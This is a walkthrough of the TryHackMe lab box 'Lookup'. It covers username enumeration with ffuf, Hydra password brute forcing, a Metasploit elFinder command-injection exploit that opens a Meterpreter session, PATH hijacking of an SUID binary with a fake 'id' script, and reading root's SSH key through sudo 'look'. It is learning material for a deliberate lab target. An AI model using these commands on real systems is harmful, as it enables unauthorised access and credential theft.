# THM Lookup Write-up
A write-up of the TryHackMe box Lookup. 

Level: Easy | OS: Linux

## Overview

### Skills Learned
- Web application enumeration and analysis
- Identifying and exploiting username enumeration vulnerabilities
- Password brute forcing using Hydra
- Exploiting vulnerable web applications (elFinder RCE)
- Linux privilege escalation techniques (PATH hijacking)
- SUID binary analysis
- Abusing sudo permissions for privilege escalation
- SSH key extraction and usage

### Tools Used
- Nmap
- Burp Suite
- ffuf
- Hydra
- Metasploit
- GTFOBins

## Initial Recon
We start with an Nmap scan of our target:

```bash
sudo nmap -sV -sC TARGET_IP
```
From the results, we can see that **port 80 (HTTP)** and **port 22 (SSH)** are open.

![Nmap Scan Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/nmap%20scan.png)

## Web Enumeration
Let's investigate port 80.

After navigating to the IP address in a browser, we can see it is trying to redirect us to:
```
lookup.thm
```
Since this domain does not resolve by default, we need to add it to our /etc/hosts file:
```bash
sudo nano /etc/hosts
```
```bash
TARGET_IP lookup.thm
```

![ETC Hosts Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/etc%20host%201.png)

After refreshing, we are brought to a simple login page:

![Login Page Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/Login%20Page.png)

## Identifying a Username Enumeration Vulnerability
Let’s test how the login behaves by trying a basic set of credentials:

```
username: test
password: test
```

We are redirected to ```/login.php```, where we see the message:
```
Wrong username or password
```

![Login Error Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/Login%20Error.png)

At this point, I decided to use Burp Suite to gather more information. After configuring Firefox to use a proxy (```127.0.0.1:8080```), I intercepted the login request and observed the following POST data:

```
username=test&password=test
```

The response again shows:

```
Wrong username or password
```

![Burp Suite Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/BurpSuite.png)

After testing a few different combinations, I noticed something interesting.

When I attempted to log in with:

```
username: admin
password: admin
```

The error message changed to:

```
Wrong password
```

![Burp Suite Screenshot 2](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/Burp%20wrong%20password.png)

This indicates that **“admin” is a valid username**, and the application is leaking this information through its error messages.

## Username Enumeration with ffuf

We can take advantage of this behavior to enumerate valid usernames.

To do this, I used ```ffuf```, a web fuzzing tool, with a [username wordlist](https://github.com/jeanphorn/wordlist/blob/master/usernames.txt) (~81,000 entries):

```bash
ffuf -w usernames.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=test' -H "Content-Type: application/x-www-form-urlencoded" -fw 10
```

### Explanation:
- ```-w usernames.txt``` → Wordlist of usernames
- ```-X POST``` → Specifies the HTTP method
- ```-u http://lookup.thm/login.php``` → Target URL
- ```-d 'username=FUZZ&password=test'``` → POST data (FUZZ for the username based on wordlist)
- ```-H "Content-Type: application/x-www-form-urlencoded"``` → Content type header (identified via Burp Suite)
- ```-fw 10``` → Filters out responses with 10 words (Wrong username or password)

The ```-fw 10``` flag is important because it filters out responses that match the “wrong username” message, allowing us to focus only on valid usernames.

### Results:
```
- admin
- jose
```

![ffuf Results Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/ffuf%20output.png)

## Password Brute Force for Jose

Now that we have another valid username (```jose```), we can attempt to crack the password using Hydra with the ```rockyou.txt``` wordlist:

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
```

### Explanation:
- ```-l jose``` → Target username
- ```-P /usr/share/wordlists/rockyou.txt``` → Password wordlist
- ```lookup.thm``` → Target domain
- ```http-post-form``` → Specifies form-based authentication
- ```/login.php``` → Specifies the /login.php directory of lookup.thm
- ```username=^USER^&password=^PASS^``` → Placeholders for Hydra (jose for username, wordlist for passwords)
- ```"Wrong"``` → Failure condition (if found in response, move on to next password)
- ```-V``` → Verbose output

After a few minutes, we get a successful login.

![Hydra Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/Hydra.png)

## Gaining Initial Access

After logging in as jose, we are redirected to:

```
files.lookup.thm
```

We need to add this to ```/etc/hosts``` as well:

```
TARGET_IP files.lookup.thm
```

![ETC Host Screenshot 2](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/etc%20host%202.png)

After refreshing, we are presented with a web application called **elFinder**. After a quick Google search, I found out that elFinder is a web-based file manager.

![elFinder Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/elFinder.png)

While browsing the files, nothing immediatly stands out. Most of the files contain a list of words and that's it.

![elFinder File Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/elFinder%20file.png)

## Exploiting elFinder

As I was investigating further, I noticed an **About section**, which revealed the version:

```
elFinder 2.1.47
```

![elFinder Version Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/elFinder%20version.png)

After a quick search, I found that elFinder versions prior to 2.1.48 are vulnerable to command injection thanks to [this](https://www.rapid7.com/db/modules/exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection/) Rapid7 article.

To exploit this, I used the Metasploit module referenced in the vulnerability write-up by Rapid7:

```
msfconsole
search elfinder
```

![Metasploit Search Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/Metasploit%20module%20search.png)

We will use:

```
exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

Set the required options:

```
set RHOSTS files.lookup.thm
set LHOST YOUR_IP
```

![Metasploit Options Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/Metasploit%20Options.png)

Then run:

```
exploit
```

This successfully gives us a Meterpreter session.

![Meterpreter Session Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/Meterpreter%20session.png)


## Shell Stabilization

Lets get a shell:

```
shell
```

Then we upgrade it:

```
SHELL=/bin/bash script -q /dev/null
```
You can find methods to upgrade shells [here](https://0xffsec.com/handbook/shells/full-tty/).

## Enumeration

The first thing I did was run:

```bash
whoami
```

Which returned ```www-data```

Let's check for other users on the system:

```bash
cat /etc/passwd
```

One interesting user I found was ```think```:

![etc passwd Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/etc%20passwd.png)

Looking in this user's home directory, I found:
- ```user.txt``` (This must be the user flag)
- ```.passwords```

Unfortunately, we do not have permission to access either of these, so we need to escalate privileges next. 

![think Home Directory Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/think%20home%20directory.png)

## Privilege Escalation via PATH Hijacking

First, let’s check for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![SUID Binaries Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/suid%20files.png)

One file that stands out is:

```
/usr/sbin/pwm
```

This is not a standard Linux binary, so it is worth investigating. Let's see what happens when we run it:

![Running pwm Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/pwm.png)

It looks like this binary does two things when we run it:
- Execute the ```id``` command to determine the current user
- Attempt to read and output a ```.passwords``` file in that user’s home directory

My best assumption is that this is a password manager program, hence the name pwm. When the user runs this program, it will determine who is running it with the ```id``` command, then use the result to look in the user's home directory for a password file and print the results.

I am hoping that the binary does **not specify the full path** when running the ```id``` command.

If this is true, the system will search for ```id``` using the ```$PATH``` variable, making it vulnerable to [**PATH hijacking**](https://attack.mitre.org/techniques/T1574/007/#:~:text=Adversaries%20may%20also,the%20malicious%20binary.).

Let's create our own malicious ```id``` file, which will trick the pwm binary into thinking we are the user ```think```. We can then include this at the beginning of our $PATH so it runs instead of the real id command, giving us the ```.passwords``` file for the ```think``` user we saw earlier.

### Exploitation Steps

Let's identify the user info for think:

```bash
id think
```

![think Info Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/id%20think.png)

Next, let's check our current $PATH:

```bash
echo $PATH
```

![Current $PATH Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/echo%20path.png)

Now we can create our malicious ```id``` binary:

```bash
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id
```

Verify:

```bash
cat /tmp/id
```

![Creating Malicious id Binary Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/creating%20fake%20id.png)

We also need to make this binary executable:

```bash
chmod +x /tmp/id
```

Verify:

```bash
ls -l /tmp
```

![Adding Execute Permissions to id File](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/add%20x%20perm%20to%20id%20file.png)


Now we need to add the /tmp directory to our $PATH:

```bash
export PATH=/tmp:$PATH
```

Verify:

```bash
echo $PATH
```

![Updating $PATH Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/updating%20PATH.png)

Now, we can try running the ```/usr/sbin/pwm``` binary again and see if our exploit works:

```bash
/usr/sbin/pwm
```

![Successfull Execution of pwm Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/successful%20pwm.png)

Success! We now have the ```.passwords``` file for the think user. Based on the content of ```.passwords```, this may be jose's account. Let's go ahead and save this to our local machine.

## SSH Access as think

If you recall from the Nmap scan, the SSH port is open. Let's try to use Hydra again to brute-force the SSH login for the ```think``` user using the ```.passwords``` file:

```bash
hydra -l think -P jose_passwords.txt ssh://TARGET_IP
```

![Hydra SSH Attempt Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/ssh%20think%20cracking.png)

Success! Let's login as ```think```:

```bash
ssh think@TARGET_IP
```

We now have access as ```think``` and can retrieve the user flag.

![User Flag Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/user%20flag.png)

## Privilege Escalation to Root

Now we need to elevate to root. Let’s try something simple first and see if that works:

```bash
sudo su
```

![Sudo su Attempt Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/failed%20sudo%20su.png)

Unsurprisingly, that did not work. Let’s check what commands ```think``` can run with sudo:

```bash
sudo -l
```

![Sudo -l Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/sudo%20-l.png)

We see that ```think``` can run ```look``` as root.

Let's get some more information about ```look``` with [GTFObins](https://gtfobins.org/gtfobins/look/#file-read)

According to GTFOBins, the ```look``` command can be used to read data from local files.

We can exploit this to read the root SSH key:

```bash
sudo look '' /root/.ssh/id_rsa
```

![Root SSH Key Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/look%20root%20ssh%20key.png)

We now have the OpenSSH private key for root!

## Root Access

Let's add this file to our local SSH directory:

```bash
cd .ssh
nano id_rsa
```

Paste the key and save.

It is required that your private key files are NOT accessible by others. Because of this, we need to change the file’s permissions to read write only for the user:

```bash
chmod 600 id_rsa
```

Now let's log in as root:

```bash
ssh root@TARGET_IP
```

![Logged in as Root Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/root%20ssh%20login.png)

We are now logged in as root and can retrieve the root flag!

```bash
cat root.txt
```

![Root Flag Screenshot](https://github.com/Cyb3rTripp/THM-Lookup-Write-up/blob/main/Screenshots/root%20flag.png)

